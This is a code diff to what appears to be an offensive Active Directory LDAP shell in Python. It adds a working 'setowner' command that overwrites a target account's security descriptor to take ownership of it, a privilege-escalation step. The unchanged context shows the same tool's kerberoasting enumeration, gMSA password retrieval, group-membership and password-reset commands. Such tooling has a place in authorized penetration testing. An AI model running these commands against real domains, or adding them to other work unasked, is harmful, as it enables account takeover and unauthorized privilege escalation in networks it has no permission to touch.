@@ -1,6 +1,7 @@
 import time
 import ssl
 from ldap3 import Server, ALL, Connection, NTLM, SUBTREE, Tls, MODIFY_ADD, MODIFY_REPLACE, SASL, KERBEROS
+from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID
 from rich import print # for colors
 import readline
 import rlcompleter
@@ -20,7 +21,7 @@ COMMANDS = [
     "sessions", "status", "query", "history", "batch_lookup",
     "categories", "groups", "users", "computers", "kerberoasting", "checkacl", "addmember",
     "setpass", "help", "exit", "savepassword", "show_all_history", "offline_search", "shares",
-    "get_sid", "getgmsa"
+    "get_sid", "getgmsa", "setowner"
 ]
 
 def shell_completer(text, state):
@@ -513,7 +514,6 @@ def list_computers(conn, base_dn):
                 print(f"[bold red]{comp} has weakkness try pre2k for this computer[/bold red]")
 
 def add_member(conn, base_dn, group_name, user_name):
-    # get user DN
     conn.search(base_dn, f"(sAMAccountName={user_name})", attributes=["distinguishedName"])
 
     if not conn.entries:
@@ -521,7 +521,6 @@ def add_member(conn, base_dn, group_name, user_name):
         return
 
     user_dn = conn.entries[0].distinguishedName.value
-    # get group DN
     conn.search(base_dn, f"(sAMAccountName={group_name})", attributes=["distinguishedName"])
 
     if not conn.entries:
@@ -529,7 +528,6 @@ def add_member(conn, base_dn, group_name, user_name):
         return
     group_dn = conn.entries[0].distinguishedName.value
 
-    # add user to group
     conn.modify(group_dn, {"member": [(MODIFY_ADD, [user_dn])]})
 
     if conn.result["result"] == 0:
@@ -546,7 +544,46 @@ def set_password(conn, user_dn, new_password):
         print("[+] Password changed")
     else:
         print("[-] Failed:", conn.result)
+def cmd_setowner(conn, base_dn, target_user, sess_user):
+    print(f"[*] Attempting to set owner of '{target_user}' to '{sess_user}'")
 
+    conn.search(base_dn, f"(sAMAccountName={sess_user})", attributes=['objectSid'])
+    if not conn.entries:
+        print(f"[bold red][-] Could not resolve SID for current user {sess_user}[/bold red]")
+        return
+    owner_sid_raw = conn.entries[0]['objectSid'].raw_values[0]
+
+    conn.search(base_dn, f"(sAMAccountName={target_user})", attributes=['distinguishedName'])
+    if not conn.entries:
+        print(f"[bold red][-] Could not resolve target user {target_user}[/bold red]")
+        return
+    target_dn = conn.entries[0].distinguishedName.value
+
+    from ldap3.protocol.microsoft import security_descriptor_control
+    ctrls = security_descriptor_control(sdflags=0x01)
+
+    conn.search(target_dn, '(objectClass=*)', search_scope='BASE', attributes=['nTSecurityDescriptor'], controls=ctrls)
+
+    if not conn.entries or 'nTSecurityDescriptor' not in conn.entries[0]:
+        print(f"[bold red][-] Could not read nTSecurityDescriptor of target. You might lack permissions![/bold red]")
+        return
+
+    current_sd_raw = conn.entries[0]['nTSecurityDescriptor'].raw_values[0]
+
+    from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID
+    sd = SR_SECURITY_DESCRIPTOR()
+    sd.fromString(current_sd_raw)
+    sd['OwnerSid'] = LDAP_SID(owner_sid_raw)
+    new_sd_raw = sd.getData()
+    
+    changes = {'nTSecurityDescriptor': [(MODIFY_REPLACE, [new_sd_raw])]}
+    
+    conn.modify(target_dn, changes, controls=ctrls)
+
+    if conn.result["result"] == 0:
+        print(f"[bold green][+] Successfully took ownership of '{target_user}'[/bold green]")
+    else:
+        print(f"[bold red][-] Failed to change owner: {conn.result['description']}[/bold red]")
 def kerberoastable(conn, base_dn):
     conn.search(base_dn, "(&(objectClass=user)(!(objectClass=computer))(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))", attributes=["sAMAccountName", "servicePrincipalName"])
     print("\n[bold red]Kerberoastable Accounts[/bold red]")
@@ -1173,8 +1210,20 @@ def connect(connection):
             except Exception as e:
                 print(f"[-] Error retrieving GMSA Password: {e}")
 
+        elif command[0] == "setowner":
+            if not current_session:
+                print("No active session! Please 'use' a session or 'connect' first.")
+                continue
+            if len(command) < 2:
+                print("setowner <target_account>")
+                continue
+            target = command[1]
+            session_username = current_session["username"]
 
-
+            try:
+                cmd_setowner(current_session["conn"], current_session["base_dn"], target, session_username)
+            except Exception as e:
+                print(f"[-] Error setting owner : {e}")
 
         elif command[0] == "exit":
             break
